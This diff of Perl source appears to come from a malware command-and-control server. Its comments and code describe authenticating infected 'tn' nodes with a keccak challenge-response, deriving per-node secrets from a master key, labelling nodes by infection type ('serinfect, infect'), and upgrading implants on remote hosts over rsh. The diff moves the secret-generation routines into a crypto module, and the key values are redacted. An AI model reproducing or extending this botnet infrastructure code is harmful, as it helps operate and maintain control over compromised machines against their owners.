@@ -43,56 +43,6 @@ use bm::crypto;
 use bm::meta;
 use bm::file;
 
-my $KEY_ID    = pack "H*", "not-the-real-secret";
-my $KEY_FIXED = pack "H*", "not-the-real-secret";
-my $KEY_NODE  = pack "H*", "not-the-real-secret";
-my $KEY_TYPE  = pack "H*", "not-the-real-secret";
-
-# tn's out there have an id and shared secret that
-# is unique to each one. the challenge response protocol works
-# by sending a random 32 byte string, the id,
-# and expects keccak(challange . id . secret)
-# server needs to know the secret.
-#
-# this can be accomplished in a variety of ways
-# the secret can be in the database, or it can be
-# derived from the id, using a secret key:
-# keccak($KEY_FIXED . keccak(secret . $KEY_FIXED))
-# the key, obviously, is only known to the c&c server
-# the tn component receives the resulting secret as commandline argument
-#
-# the first byte of keccak(id . $KEY_TYPE) also encodes a type
-# 1 - serinfect, infect
-# 2 - tnr upgraded
-# 3 - tncmd
-
-sub gensecret($)
-{
-	my ($id) = @_;
-
-	$id = Digest::KeccakOld::sha3_256 $id . $KEY_FIXED;
-	$id = Digest::KeccakOld::sha3_256 $KEY_FIXED . $id;
-
-	$id
-}
-
-sub gencreds(;$)
-{
-	my ($type) = @_;
-
-	my $id0 = bm::crypto::randbytes 32;
-	my $c;
-
-	while () {
-		my $id = $id0 ^ pack "N", $c;
-
-		return ($id, gensecret $id)
-			if $type == ord Digest::KeccakOld::sha3_256 $id . $KEY_TYPE;
-
-		++$c;
-	}
-}
-
 sub format_credarg($$$)
 {
 	my ($id, $secret, $port) = @_;
@@ -101,27 +51,6 @@ sub format_credarg($$$)
 	$arg =~ y/0-9a-f/a-q/;
 
 	$arg
-}
-
-# get secrte for id
-sub secret($)
-{
-	my ($id) = @_;
-
-	my ($key, $secret);
-
-	if (defined(my $secret1 = sql_fetch "select secret1 from node where id = ?", $id)) {
-		$key    = $KEY_NODE;
-		$secret = $secret1;
-	} else {
-		$key    = $KEY_FIXED;
-		$secret = $id;
-	}
-
-	$secret = Digest::KeccakOld::sha3_256 $secret . $key;
-	$secret = Digest::KeccakOld::sha3_256 $key . $secret;
-
-	$secret
 }
 
 sub new
@@ -161,11 +90,10 @@ sub _new
 
 	($self->{chg}) = bn::io::xread $fh, 32 or return;
 	($self->{id})  = bn::io::xread $fh, 32 or return;
-	$self->{secret} = secret $self->{id};
 
 	setsockopt $fh, Socket::IPPROTO_TCP, Socket::TCP_NODELAY, pack "i", 1;
 
-	bn::io::xwrite $fh, pack "C/a", Digest::KeccakOld::sha3_256 "$self->{chg}$self->{id}$self->{secret}";
+	bn::io::xwrite $fh, pack "C/a", bm::crypto::tn_response $self->{id}, $self->{chg};
 
 	($self->{version}, $self->{arch}) = split /\//, $self->rpkt;
 	$self->{endian} = $self->rpkt eq "\x11\x22\x33\x44" ? ">" : "<";
@@ -224,6 +152,8 @@ sub _new
 sub DESTROY
 {
 	my ($self) = @_;
+
+	warn "$self->{name}: closing, r $self->{rcv} w $self->{snt}\n" if TRACE;
 
 	$self->{coro}->cancel;
 	%$self = ();
@@ -1183,7 +1113,7 @@ sub upgrade_tn
 			or die "$self->{name}: unable to dl net_tn\n";
 	}
 
-	my $creds = format_credarg $self->{id}, gensecret $self->{id}, $self->{port};
+	my $creds = format_credarg $self->{id}, bm::crypto::tn_gensecret $self->{id}, $self->{port};
 
 	#  my $out = $self->rsh ("\Q$lair\E/.net_tnx $creds 2>&1");
 	#	my $out = $self->rsh ("echo hi");
